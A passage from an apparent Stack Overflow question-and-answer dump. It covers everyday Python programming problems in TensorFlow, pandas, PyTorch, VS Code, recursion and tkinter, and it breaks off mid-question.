ds = tfds.load('iris', split='train', shuffle_files=True, as_supervised=True, batch_size=10)
model = tf.keras.Sequential([
    tf.keras.layers.Dense(10,activation=&quot;relu&quot;),
    tf.keras.layers.Dense(10,activation=&quot;relu&quot;),
    tf.keras.layers.Dense(3, activation=&quot;softmax&quot;)
])

model.compile(
    optimizer=tf.keras.optimizers.Adam(0.001),
    loss=tf.keras.losses.SparseCategoricalCrossentropy(),
    metrics=[tf.keras.metrics.SparseCategoricalAccuracy()],
)
model.fit(ds, epochs=100)
</code></pre>
<p>Also regarding <code>model.fit</code>, the <a href=""https://www.tensorflow.org/api_docs/python/tf/keras/Model#fit"" rel=""noreferrer"">docs</a> state:</p>
<blockquote>
<p>Integer or None. Number of samples per gradient update. If
unspecified, batch_size will default to 32. <strong>Do not specify</strong> the
batch_size if your data is in the form of datasets, generators, or
keras.utils.Sequence instances (since they generate batches).</p>
</blockquote>
"
"72984800","1","Why does unpacking non-identifier strings work on a function call?","<p>I've noticed, to my surprise, that in a function call, I could unpack a <code>dict</code> with strings <em>that weren't even valid python identifiers</em>.</p>
<p>It's surprising to me since argument names must be identifiers, so allowing a function call to unpack a <code>**kwargs</code> that has non-identifiers, with no run time error, doesn't seem healthy (since it could bury problems deeper that where they actually occur).</p>
<p>Unless there's an actual <strong>use</strong> to being able to do this, in which case my question becomes &quot;what would that use be?&quot;.</p>
<h2>Example code</h2>
<p>Consider this function:</p>
<pre class=""lang-py prettyprint-override""><code>def foo(**kwargs):
    first_key, first_val = next(iter(kwargs.items()))
    print(f&quot;{first_key=}, {first_val=}&quot;)
    return kwargs
</code></pre>
<p>This shows that, within a function call, you can't unpack a <code>dict</code> that has has integer keys, which is EXPECTED.</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; t = foo(**{1: 2, 3: 4})
TypeError                                 Traceback (most recent call last)
...
TypeError: foo() keywords must be strings
</code></pre>
<p>What is really not expected, and surprising, is that you can, on the other hand, unpack a <code>dict</code> with string keys, even if these are not valid python identifiers:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; t = foo(**{'not an identifier': 1, '12': 12, ',(*&amp;$)': 100})
first_key='not an identifier', first_val=1
&gt;&gt;&gt; t
{'not an identifier': 1, '12': 12, ',(*&amp;$)': 100}
</code></pre>
","72985667","<p>Looks like this is more of a <code>kwargs</code> issue than an unpacking issue. For example, one wouldn't run into the same issue with <code>foo</code>:</p>
<pre><code>def foo(a, b):
    print(a + b)

foo(**{&quot;a&quot;: 3, &quot;b&quot;: 2})
# 5

foo(**{&quot;a&quot;: 3, &quot;b&quot;: 2, &quot;c&quot;: 4})
# TypeError: foo() got an unexpected keyword argument 'c'

foo(**{&quot;a&quot;: 3, &quot;b&quot;: 2, &quot;not valid&quot;: 4})
# TypeError: foo() got an unexpected keyword argument 'not valid'
</code></pre>
<p>But when <code>kwargs</code> is used, that flexibility comes with a price. It looks like the function first attempts to pop out and map all the named arguments and then passes the remaining items in a <code>dict</code> called <code>kwargs</code>. Since all keywords are strings (but all strings are not valid keywords), the first check is easy - <code>keywords must be strings</code>. Beyond that, it's up to the author to figure out what to do with remaining items in <code>kwargs</code>.</p>
<pre><code>def bar(a, **kwargs):
    print(locals())
    
bar(a=2)
# {'a': 2, 'kwargs': {}}

bar(**{&quot;a&quot;: 3, &quot;b&quot;: 2})
# {'a': 3, 'kwargs': {'b': 2}}

bar(**{&quot;a&quot;: 3, &quot;b&quot;: 2, &quot;c&quot;: 4})
# {'a': 3, 'kwargs': {'b': 2, 'c': 4}}

bar(**{1: 3, 3: 4})
# TypeError: keywords must be strings
</code></pre>
<p>Having said all that, there definitely is inconsistency but not a flaw. Some related discussions:</p>
<ol>
<li><a href=""https://discuss.python.org/t/supporting-or-not-invalid-identifiers-in-kwargs/17147"" rel=""nofollow noreferrer"">Supporting (or not) invalid identifiers in **kwargs </a></li>
<li><a href=""https://stackoverflow.com/q/16700006/7128934"">feature: **kwargs allowing improperly named variables</a></li>
</ol>
"
"73635605","1","Combine multiple columns into one category column using the column names as value label","<p>I have this data</p>
<pre><code>   ID      A      B      C
0   0   True  False  False
1   1  False   True  False
2   2  False  False   True
</code></pre>
<p>And want to transform it into</p>
<pre><code>   ID group
0   0     A
1   1     B
2   2     C
</code></pre>
<ul>
<li>I want to use the column names as value labels for the <code>category</code> column.</li>
<li>There is a maximum of only one <code>True</code> value per row.</li>
</ul>
<p>This is the MWE</p>
<pre><code>#!/usr/bin/env python3
import pandas as pd

df = pd.DataFrame({
    'ID': range(3),
    'A': [True, False, False],
    'B': [False, True, False],
    'C': [False, False, True]
})

result = pd.DataFrame({
    'ID': range(3),
    'group': ['A', 'B', 'C']
})
result.group = result.group.astype('category')

print(df)
print(result)
</code></pre>
<p>I could do <code>df.apply(lambda row: ...magic.., axis=1)</code>. But isn't there a more elegant way with pandas' own tools?</p>
","73635685","<p>You can use melt then a lookup based on the column where the values are true to get the results you are expecting</p>
<pre><code>df = df.melt(id_vars = 'ID', var_name = 'group')
df.loc[df['value'] == True][['ID', 'group']]
</code></pre>
"
"73629154","1","Command Line stable diffusion runs out of GPU memory but GUI version doesn't","<p>I installed the GUI version of Stable Diffusion <a href=""https://grisk.itch.io/stable-diffusion-gui"" rel=""noreferrer"">here</a>. With it I was able to make 512 by 512 pixel images using my GeForce RTX 3070 GPU with 8 GB of memory:</p>
<p><a href=""https://i.stack.imgur.com/vN4MW.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/vN4MW.png"" alt=""GUI screenshot"" /></a></p>
<p>However when I try to do the same thing with the command line interface, I run out of memory:</p>
<p>Input:<br>
<code>&gt;&gt; C:\SD\stable-diffusion-main&gt;python scripts/txt2img.py --prompt &quot;a close-up portrait of a cat by pablo picasso, vivid, abstract art, colorful, vibrant&quot; --plms --n_iter 3 --n_samples 1 --H 512 --W 512</code></p>
<p>Error:</p>
<p><code>RuntimeError: CUDA out of memory. Tried to allocate 1024.00 MiB (GPU 0; 8.00 GiB total capacity; 6.13 GiB already allocated; 0 bytes free; 6.73 GiB reserved in total by PyTorch) If reserved memory is &gt;&gt; allocated memory try setting max_split_size_mb to avoid fragmentation.  See documentation for Memory Management and PYTORCH_CUDA_ALLOC_CONF</code></p>
<p>If I reduce the size of the image to 256 X 256, it gives a result, but obviously much lower quality.</p>
<p>So part 1 of my question is why do I run out of memory at 6.13 GiB when I have 8 GiB on the card, and part 2 is what does the GUI do differently to allow 512 by 512 output? Is there a setting I can change to reduce the load on the GPU?</p>
<p>Thanks a lot,
Alex</p>
","73642630","<p>This might not be the only answer, but I solved it by using the optimized version <a href=""https://github.com/basujindal/stable-diffusion"" rel=""noreferrer"">here</a>. If you already have the standard version installed, just copy the &quot;OptimizedSD&quot; folder into your existing folders, and then run the optimized txt2img script instead of the original:</p>
<p><code>&gt;&gt; python optimizedSD/optimized_txt2img.py --prompt &quot;a close-up portrait of a cat by pablo picasso, vivid, abstract art, colorful, vibrant&quot; --H 512 --W 512 --seed 27 --n_iter 2 --n_samples 10 --ddim_steps 50</code></p>
<p>It's quite slow on my computer, but produces 512 X 512 images!</p>
<p>Thanks,
Alex</p>
"
"74290259","1","count the number of three way conversations in a group chat dataset using pandas","<p>I wanted to count the number of three way conversations that have occured in a dataset.
A chat <code>group_x</code> can consist of multiple members.</p>
<p>What is a three way conversation?</p>
<ol>
<li>1st way - <code>red</code>_x sends a message in the group_x.</li>
<li>2nd way - <code>green</code>_x replies in the same group_x.</li>
<li>3rd way - <code>red</code>_x sends a reply in the same group_x.</li>
</ol>
<p>This can be called a three way conversation.</p>
<p>The sequence has to be exactly red_#, green_#, red_#.</p>
<p>What is touchpoint?</p>
<ol>
<li>Touchpoint 1 - red_x's first message.</li>
<li>Touchpoint 2 - green_x's first message.</li>
<li>Touchpoint 3 - red_x's second message.</li>
</ol>
<p>Code to easily generate a sample dataset I'm working with.</p>
<pre class=""lang-py prettyprint-override""><code>import pandas as pd
from pandas import Timestamp

t1_df = pd.DataFrame({'from_red': [True, False, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, False, True], 
              'sent_time': [Timestamp('2021-05-01 06:26:00'), Timestamp('2021-05-04 10:35:00'), Timestamp('2021-05-07 12:16:00'), Timestamp('2021-05-07 12:16:00'), Timestamp('2021-05-09 13:39:00'), Timestamp('2021-05-11 10:02:00'), Timestamp('2021-05-12 13:10:00'), Timestamp('2021-05-12 13:10:00'), Timestamp('2021-05-13 09:46:00'), Timestamp('2021-05-13 22:30:00'), Timestamp('2021-05-14 14:14:00'), Timestamp('2021-05-14 17:08:00'), Timestamp('2021-06-01 09:22:00'), Timestamp('2021-06-01 21:26:00'), Timestamp('2021-06-03 20:19:00'), Timestamp('2021-06-03 20:19:00'), Timestamp('2021-06-09 07:24:00'), Timestamp('2021-05-01 06:44:00'), Timestamp('2021-05-01 08:01:00'), Timestamp('2021-05-01 08:09:00')], 
              'w_uid': ['w_000001', 'w_112681', 'w_002516', 'w_002514', 'w_004073', 'w_005349', 'w_006803', 'w_006804', 'w_008454', 'w_009373', 'w_010063', 'w_010957', 'w_066840', 'w_071471', 'w_081446', 'w_081445', 'w_106472', 'w_000002', 'w_111906', 'w_000003'], 
              'user_id': ['red_00001', 'green_0263', 'red_01071', 'red_01071', 'red_01552', 'red_01552', 'red_02282', 'red_02282', 'red_02600', 'red_02854', 'red_02854', 'red_02600', 'red_00001', 'red_09935', 'red_10592', 'red_10592', 'red_12292', 'red_00002', 'green_0001', 'red_00003'], 
              'group_id': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1], 
              'touchpoint': [1, 2, 1, 3, 1, 3, 1, 3, 1, 1, 3, 3, 3, 1, 1, 3, 1, 1, 2, 1]}, 
                     columns = ['from_red', 'sent_time', 'w_uid', 'user_id', 'group_id', 'touchpoint'])

t1_df['sent_time'] = pd.to_datetime(t1_df['sent_time'], format = &quot;%d-%m-%Y&quot;)
t1_df
</code></pre>
<p>The dataset looks like this:</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th>from_red</th>
<th>sent_time</th>
<th>w_uid</th>
<th>user_id</th>
<th>group_id</th>
<th>touchpoint</th>
</tr>
</thead>
<tbody>
<tr>
<td>True</td>
<td>2021-05-01 06:26:00</td>
<td>w_000001</td>
<td>red_00001</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>False</td>
<td>2021-05-04 10:35:00</td>
<td>w_112681</td>
<td>green_0263</td>
<td>0</td>
<td>2</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-07 12:16:00</td>
<td>w_002516</td>
<td>red_01071</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-07 12:16:00</td>
<td>w_002514</td>
<td>red_01071</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-09 13:39:00</td>
<td>w_004073</td>
<td>red_01552</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-11 10:02:00</td>
<td>w_005349</td>
<td>red_01552</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-12 13:10:00</td>
<td>w_006803</td>
<td>red_02282</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-12 13:10:00</td>
<td>w_006804</td>
<td>red_02282</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-13 09:46:00</td>
<td>w_008454</td>
<td>red_02600</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-13 22:30:00</td>
<td>w_009373</td>
<td>red_02854</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-14 14:14:00</td>
<td>w_010063</td>
<td>red_02854</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-14 17:08:00</td>
<td>w_010957</td>
<td>red_02600</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-06-01 09:22:00</td>
<td>w_066840</td>
<td>red_00001</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-06-01 21:26:00</td>
<td>w_071471</td>
<td>red_09935</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-06-03 20:19:00</td>
<td>w_081446</td>
<td>red_10592</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-06-03 20:19:00</td>
<td>w_081445</td>
<td>red_10592</td>
<td>0</td>
<td>3</td>
</tr>
<tr>
<td>True</td>
<td>2021-06-09 07:24:00</td>
<td>w_106472</td>
<td>red_12292</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-01 06:44:00</td>
<td>w_000002</td>
<td>red_00002</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>False</td>
<td>2021-05-01 08:01:00</td>
<td>w_111906</td>
<td>green_0001</td>
<td>1</td>
<td>2</td>
</tr>
<tr>
<td>True</td>
<td>2021-05-01 08:09:00</td>
<td>w_000003</td>
<td>red_00003</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
</div>
<p>Here is what I have tried, but the query is taking too long. Is there a faster way to achieve the same?</p>
<pre class=""lang-py prettyprint-override""><code>test_df = pd.DataFrame()
for i in range(len(t1_df['sent_time'])-1):
    if t1_df.query(f&quot;group_id == {i}&quot;)['from_red'].nunique() == 2:
        y = t1_df.query(f&quot;group_id == {i} &amp; touchpoint == 2&quot;).loc[:, ['sent_time']].values[0][0]
        x = t1_df.query(f&quot;group_id == {i} &amp; sent_time &gt; @y &amp; (touchpoint == 3)&quot;).sort_values('sent_time')
        test_df = pd.concat([test_df, x])
        test_df.merge(x, how = &quot;outer&quot;)
        
    else:
        pass

test_df
</code></pre>
","74401453","<p>For me it's not clear how you define the &quot;three way conversation&quot;. Within on group, if you have the <code>input</code> messages what option(s) do you consider as &quot;three way conversation&quot;? There are several options:</p>
<pre><code>Input  : red_0, red_2, green_0, red_1, red_0, red_2, red_1
Option1:        red_2, green_0, red_1
Option2: red_0,        green_0,        red_0
   +   :        red_2, green_0,               red_2
</code></pre>
<p>and many more. Your code example returns the second msg of a user when sent after green:</p>
<pre><code>OptionX:               green_0,         red_0
   +   :               green_0,               red_2
   +   :               green_0,                      red_1
</code></pre>
<p>without keeping track if some red user sent a msg before green. Another question is, what happens if green is sending multiple times within one group.</p>
<pre><code>Input  : red_0, red_2, green_0, green_0, red_1, red_0, green_1, red_1
</code></pre>
<p>Based on your description &quot;The sequence has to be exactly <code>red_#, green_#, red_#</code>.&quot; I guess, Option1 is what you are looking for and maybe that it's even independent from the color: <code>color0_#, color1_#, color0_#</code>. Correct me if I'm wrong ;).</p>
<h1>Prepare the DataFrame</h1>
<p>To get the operation more generic, I would first prepare the DataFrame, e.g. extract the color of the user and get a integer represenation for the color</p>
<pre class=""lang-py prettyprint-override""><code># extract the user color and id
t1_df[['color', 'id']] = t1_df.pop('user_id').str.split('_', expand=True)
# get the dtypes right, also it is not needed here
t1_df.id = t1_df.id.astype(int)
t1_df.color = t1_df.color.astype('category')
# get color as intager
t1_df['color_as_int'] =pd.factorize(t1_df.color)[0]
</code></pre>
<h1>Detect the sequence <code>color0_#, color1_#, color0_#</code></h1>
<pre class=""lang-py prettyprint-override""><code># a three way conversation is where color_as_int is [...,a,b,a,...]
# expressed as difference it's color_as_int.diff() is [...,c,-c,...]
# get the difference with tracking the group, therefore first sort
t1_df.sort_values(['group_id', 'sent_time'], inplace=True)
d_color = t1_df.groupby(['group_id']).color_as_int.diff()
m = (d_color != 0) &amp; (d_color == -d_color.shift(-1))  # detect [...,c,-c,...]
# count up for each three way conversation
m[m] = m[m].cumsum()
m = m.astype(int)

# get the labels for the dataframe [...,a,b,a,...]
t1_df['three_way_conversation'] = m + m.shift(1, fill_value=0) + m.shift(-1, fill_value=0)
</code></pre>
<p>which returns and works for any color</p>
<pre class=""lang-py prettyprint-override""><code>columns = ['sent_time', 'group_id', 'color', 'id', 'touchpoint']
print(t1_df.loc[t1_df['three_way_conversation']&gt;0, columns])

             sent_time  group_id  color    id  touchpoint
0  2021-05-01 06:26:00         0    red     1           1
1  2021-05-04 10:35:00         0  green   263           2
2  2021-05-07 12:16:00         0    red  1071           1
17 2021-05-01 06:44:00         1    red     2           1
18 2021-05-01 08:01:00         1  green     1           2
19 2021-05-01 08:09:00         1    red     3           1
</code></pre>
<h2>Bonus</h2>
<p>with the DataFrame preparation you can easily count the msg per color or user within a group or get the first and last time of a msg from a color or user. <code>cumcount</code> is faster as <code>count</code> and <code>pd.merg()</code> afterwards.</p>
<pre class=""lang-py prettyprint-override""><code>t1_df['color_msg_count'] = t1_df.groupby(['group_id', 'color']).cumcount() + 1
t1_df['user_msg_count'] = t1_df.groupby(['group_id', 'color', 'id']).cumcount() + 1

t1_df['user_sent_time_min'] = t1_df.sort_values('sent_time').groupby(['group_id', 'color', 'id']).sent_time.cummin()
t1_df['user_sent_time_max'] = t1_df.sort_values('sent_time', ascending=False).groupby(['group_id', 'color', 'id']).sent_time.cummax()
</code></pre>
"
"72103359","1","Format a Jupyter notebook on save in VSCode","<p>I use <code>black</code> to automatically format all of my Python code whenever I save in VSCode. I'd like the same functionality, but within a Jupyter notebook in VSCode.</p>
<p><a href=""https://stackoverflow.com/questions/65747615/how-to-format-jupyter-notebook-in-vscode"">This answer</a> shows how to right click and format a cell or a whole notebook from the right click context menu, or a keyboard shortcut. Can I make this happen on save instead?</p>
<p>It looks like there is an <a href=""https://github.com/microsoft/vscode/issues/120432"" rel=""noreferrer"">issue</a> related to this, but it is over a year old.</p>
<p>Are there any good workarounds? Maybe a way to set the format notebook option to the same keybinding as save?</p>
<p>UPDATE:</p>
<p>If you like me want this functionality to be added please go to the <a href=""https://github.com/microsoft/vscode-jupyter/issues/7058"" rel=""noreferrer"">issue</a> and upvote it, the devs said they will need a bunch of upvotes before it's considered.</p>
","73225286","<p>This is not officially supported, but there could be workarounds.</p>
<p>From janosh's <a href=""https://github.com/microsoft/vscode/issues/120432#issuecomment-1133959273"" rel=""nofollow noreferrer"">reply</a> on GitHub:</p>
<p>There is a setting <code>editor.codeActionsOnSave</code> but it doesn't allow running arbitrary shell commands (for security reasons?) so you'd need to install an extension like <a href=""https://marketplace.visualstudio.com/items?itemName=emeraldwalk.RunOnSave"" rel=""nofollow noreferrer"">Run On Save</a> and get it to call <code>black path/to/file.ipynb</code> on save events.</p>
<p>Sadly even that doesn't work right now since VS Code does not yet expose lifecycle events for notebooks. The issue to upvote for that is: <a href=""https://github.com/microsoft/vscode/issues/130799"" rel=""nofollow noreferrer"">Improve workspace API for Notebook lifecycle to support (at least) saving events</a></p>
<p>If both get implemented, you should be able to add this to your settings to auto-format Jupyter notebooks:</p>
<pre><code>&quot;emeraldwalk.runonsave&quot;: {
  &quot;commands&quot;: [
    {
      &quot;match&quot;: &quot;\\.ipynb$&quot;,
      &quot;cmd&quot;: &quot;black ${file}&quot;
    }
  ]
}
</code></pre>
"
"72224866","1","How to get time taken for each layer in Pytorch?","<p>I want to know the inference time of a layer in Alexnet. This code measures the inference time of the first fully connected layer of Alexnet as the batch size changes. And I have a few questions about this.</p>
<ol>
<li>Is it possible to measure the inference time accurately with the following code?</li>
<li>Is there a time difference because the CPU and GPU run separately?</li>
<li>Is there a module used to measure layer inference time in Pytorch?</li>
</ol>
<p>Given the following code:</p>
<pre><code>import torch
import torch.optim as optim
import torch.nn as nn
import torch.nn.functional as F
from torchvision import transforms
import time
from tqdm import tqdm


class AlexNet(nn.Module):
    def __init__(self):
        super(AlexNet, self).__init__()

        self.relu = nn.ReLU(inplace=True)
        self.maxpool2D = nn.MaxPool2d(kernel_size=3, stride=2, padding=0)
        self.adaptive_avg_polling = nn.AdaptiveAvgPool2d((6, 6))
        self.dropout = nn.Dropout(p=0.5)

        self.conv1 = nn.Conv2d(3, 64, kernel_size=11, stride=4, padding=2)
        self.conv2 = nn.Conv2d(64, 192, kernel_size=5, padding=2)
        self.conv3 = nn.Conv2d(192, 384, kernel_size=3, padding=1)
        self.conv4 = nn.Conv2d(384, 256, kernel_size=3, padding=1)
        self.conv5 = nn.Conv2d(256, 256, kernel_size=3, padding=1)
        self.fc1 = nn.Linear(256 * 6 * 6, 4096)
        self.fc2 = nn.Linear(4096, 4096)
        self.fc3 = nn.Linear(4096, 1000)

    def time(self, x):
        x = self.maxpool2D(self.relu(self.conv1(x)))
        x = self.maxpool2D(self.relu(self.conv2(x)))
        x =                self.relu(self.conv3(x))
        x =                self.relu(self.conv4(x))
        x = self.maxpool2D(self.relu(self.conv5(x)))
        x = self.adaptive_avg_polling(x)


        x = x.view(x.size(0), -1)
        x = self.dropout(x)

        start1 = time.time()
        x = self.fc1(x)
        finish1 = time.time()

        x = self.dropout(self.relu(x))
        x = self.fc2(x)
        x = self.relu(x)
        x = self.fc3(x)

        return finish1 - start1



def layer_time():
     use_cuda = torch.cuda.is_available()
     print(&quot;use_cuda : &quot;, use_cuda)

     FloatTensor = torch.cuda.FloatTensor if use_cuda else torch.FloatTensor
     device= torch.device(&quot;cuda:0&quot; if use_cuda else &quot;cpu&quot;)

     net = AlexNet().to(device)

     test_iter = 10000
     batch_size = 1
     for i in range(10):
         X = torch.randn(size=(batch_size, 3, 227, 227)).type(FloatTensor)
         s = 0.0
         for i in tqdm(range(test_iter)):
             s += net.time(X)
         print(s)
         batch_size *= 2


 layer_time()

</code></pre>
","73269143","<p>I found a way to measure inference time by studying the <a href=""https://pytorch.org/tutorials/recipes/recipes/amp_recipe.html"" rel=""nofollow noreferrer"">AMP document</a>. Using this, the GPU and CPU are synchronized and the inference time can be measured accurately.</p>
<pre class=""lang-py prettyprint-override""><code>import torch, time, gc

# Timing utilities
start_time = None

def start_timer():
    global start_time
    gc.collect()
    torch.cuda.empty_cache()
    torch.cuda.reset_max_memory_allocated()
    torch.cuda.synchronize()
    start_time = time.time()

def end_timer():
    torch.cuda.synchronize()
    end_time = time.time()
    return end_time - start_time
</code></pre>
<p>So my code changes as follows:</p>
<pre><code>import torch, time, gc
from tqdm import tqdm
import torch.nn as nn
import torch

# Timing utilities
start_time = None

def start_timer():
    global start_time
    gc.collect()
    torch.cuda.empty_cache()
    torch.cuda.reset_max_memory_allocated()
    torch.cuda.synchronize()
    start_time = time.time()

def end_timer():
    torch.cuda.synchronize()
    end_time = time.time()
    return end_time - start_time


class AlexNet(nn.Module):
    def __init__(self):
        super(AlexNet, self).__init__()

        self.relu = nn.ReLU(inplace=True)
        self.maxpool2D = nn.MaxPool2d(kernel_size=3, stride=2, padding=0)
        self.adaptive_avg_polling = nn.AdaptiveAvgPool2d((6, 6))
        self.dropout = nn.Dropout(p=0.5)

        self.conv1 = nn.Conv2d(3, 64, kernel_size=11, stride=4, padding=2)
        self.conv2 = nn.Conv2d(64, 192, kernel_size=5, padding=2)
        self.conv3 = nn.Conv2d(192, 384, kernel_size=3, padding=1)
        self.conv4 = nn.Conv2d(384, 256, kernel_size=3, padding=1)
        self.conv5 = nn.Conv2d(256, 256, kernel_size=3, padding=1)
        self.fc1 = nn.Linear(256 * 6 * 6, 4096)
        self.fc2 = nn.Linear(4096, 4096)
        self.fc3 = nn.Linear(4096, 1000)

    def time(self, x):
        x = self.maxpool2D(self.relu(self.conv1(x)))
        x = self.maxpool2D(self.relu(self.conv2(x)))
        x =                self.relu(self.conv3(x))
        x =                self.relu(self.conv4(x))
        x = self.maxpool2D(self.relu(self.conv5(x)))
        x = self.adaptive_avg_polling(x)


        x = x.view(x.size(0), -1)
        x = self.dropout(x)

        # Check first linear layer inference time
        start_timer()
        x = self.fc1(x)
        result = end_timer()

        x = self.dropout(self.relu(x))
        x = self.fc2(x)
        x = self.relu(x)
        x = self.fc3(x)

        return result


def layer_time():
     use_cuda = torch.cuda.is_available()
     print(&quot;use_cuda : &quot;, use_cuda)

     FloatTensor = torch.cuda.FloatTensor if use_cuda else torch.FloatTensor
     device= torch.device(&quot;cuda:0&quot; if use_cuda else &quot;cpu&quot;)

     net = AlexNet().to(device)

     test_iter = 1000
     batch_size = 1
     for i in range(10):
         X = torch.randn(size=(batch_size, 3, 227, 227)).type(FloatTensor)
         s = 0.0
         for i in tqdm(range(test_iter)):
             s += net.time(X)
         print(s)
         batch_size *= 2

layer_time()
</code></pre>
"
"73647685","1","Why does a temporary variable in Python change how this Pass-By-Sharing variable behaves?","<p>first-time questioner here so do highlight my mistakes.</p>
<p>I was grinding some Leetcode and came across a behavior (not related to the problem) in Python I couldn't quite figure out nor google-out. It's especially difficult because I'm not sure if my lack of understanding is in:</p>
<ol>
<li>recursion</li>
<li>the <code>+=</code> operator in Python or variable assignment in general</li>
<li>or Python's pass-by-sharing behavior</li>
<li>or just something else entirely</li>
</ol>
<p>Here's the simplified code:</p>
<pre><code>class Holder:
    def __init__(self, val=0):
         self.val = val

class Solution:
    def runThis(self):
        holder = Holder()
        self.diveDeeper(holder, 5)
        return 
        
    def diveDeeper(self, holder, n):
        if n==0:
            return 1

        # 1) Doesn't result in mutation
        holder.val += self.diveDeeper(holder, n-1)

        # 2) Also doesn't result in mutation
        # holder.val = holder.val + self.diveDeeper(holder, n-1)

        # 3) !! Results in mutations
        # returnVal = self.diveDeeper(holder, n-1)
        # holder.val += returnVal

        print(holder.val)
        return 1

a = Solution()
a.runThis()
</code></pre>
<p>So yeah my main source of confusion is how (1) and (3) look semantically identical to me but results in two completely different outcomes:</p>
<pre><code>================ RESTART: Case 1 ===============
1
1
1
1
1
&gt;&gt;&gt; 
================ RESTART: Case 3 ===============

1
2
3
4
5
&gt;&gt;&gt; 
</code></pre>
<p>From (2), it doesn't seem related to the <code>+=</code> operator and for brevity, I haven't included the tens of variations I've tried but none of them have given me any leads so far. Would really appreciate any pointers in the right direction (especially in case I get blindsided in job interviews lmao)</p>
<p>PS: In case this is relevant, I'm using Python 3.8.2</p>
","73648204","<p>In Python, if you have <code>expression1() + expression2()</code>, <code>expression1()</code> is evaluated first.</p>
<p>So 1 and 2 are really equivalent to:</p>
<pre><code>left = holder.val
right = self.diveDeeper(holder, n - 1)
holder.val = left + right
</code></pre>
<p>Now, <code>holder.val</code> is only ever modified after the recursive call, but you use the value from before the recursive call, which means that no matter the iteration, <code>left == 0</code>.</p>
<p>Your solution 3 is equivalent to:</p>
<pre><code>right = self.diveDeeper(holder, n - 1)
left = holder.val
holder.val = left + right
</code></pre>
<p>So the recursive call is made before <code>left = holder.val</code> is evaluated, which means <code>left</code> is now the result of the sum of the previous iteration.</p>
<p>This is why you have to be careful with mutable state, you got to understand the order of operations perfectly.</p>
"
"74447766","1","Tkinter - Use characters/bytes offset as index for text widget","<p>I want to delete part of a text widget's content, using only character offset (or bytes if possible).</p>
<p>I know how to do it for lines, words, etc. Looked around a lot of documentations:</p>
<ul>
<li><a href=""https://www.tcl.tk/man/tcl8.6/TkCmd/text.html#M24"" rel=""noreferrer"">https://www.tcl.tk/man/tcl8.6/TkCmd/text.html#M24</a></li>
<li><a href=""https://tkdocs.com/tutorial/text.html"" rel=""noreferrer"">https://tkdocs.com/tutorial/text.html</a></li>
<li><a href=""https://anzeljg.github.io/rin2/book2/2405/docs/tkinter/text-methods.html"" rel=""noreferrer"">https://anzeljg.github.io/rin2/book2/2405/docs/tkinter/text-methods.html</a></li>
<li><a href=""https://web.archive.org/web/20120112185338/http://effbot.org/tkinterbook/text.htm"" rel=""noreferrer"">https://web.archive.org/web/20120112185338/http://effbot.org/tkinterbook/text.htm</a></li>
</ul>
<p>Here is an example mre:</p>
<pre class=""lang-py prettyprint-override""><code>import tkinter as tk

root = tk.Tk()

text = tk.Text(root)

txt = &quot;&quot;&quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit.
Suspendisse enim lorem, aliquam quis quam sit amet, pharetra porta lectus.
Nam commodo imperdiet sapien, in maximus nibh vestibulum nec.
Quisque rutrum massa eget viverra viverra. Vivamus hendrerit ultricies nibh, ac tincidunt nibh eleifend a. Nulla in dolor consequat, fermentum quam quis, euismod dui.
Nam at gravida nisi. Cras ut varius odio, viverra molestie arcu.

Pellentesque scelerisque eros sit amet sollicitudin venenatis.
Proin fermentum vestibulum risus, quis suscipit velit rutrum id.
Phasellus nisl justo, bibendum non dictum vel, fermentum quis ipsum.
Nunc rutrum nulla quam, ac pretium felis dictum in. Sed ut vestibulum risus, suscipit tempus enim.
Nunc a imperdiet augue.
Nullam iaculis consectetur sodales.
Praesent neque turpis, accumsan ultricies diam in, fermentum semper nibh.
Nullam eget aliquet urna, at interdum odio. Nulla in mi elementum, finibus risus aliquam, sodales ante.
Aenean ut tristique urna, sit amet condimentum quam. Mauris ac mollis nisi.
Proin rhoncus, ex venenatis varius sollicitudin, urna nibh fringilla sapien, eu porttitor felis urna eu mi.
Aliquam aliquam metus non lobortis consequat.
Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Aenean id orci dui.&quot;&quot;&quot;

text.insert(tk.INSERT, txt)


def test_delete(event=None):
    text.delete() # change this line here

text.pack(fill=&quot;both&quot;, expand=1)
text.pack_propagate(0)
text.bind('&lt;Control-e&gt;', test_delete)
root.mainloop()
</code></pre>
<p>It display an example text inside a variable, inside a text widget. I use a single key binding to test some of the possible ways to do what I want on that piece of text.</p>
<p>I tried a lot of things, both from the documentation(s) and my own desperation:</p>
<ul>
<li><code>text.delete(0.X)</code>: where X is any number. I thought since lines were <code>1.0</code>, maybe using 0.X would work on chars only. It only work with a single char, regardless of what X is (even with a big number).</li>
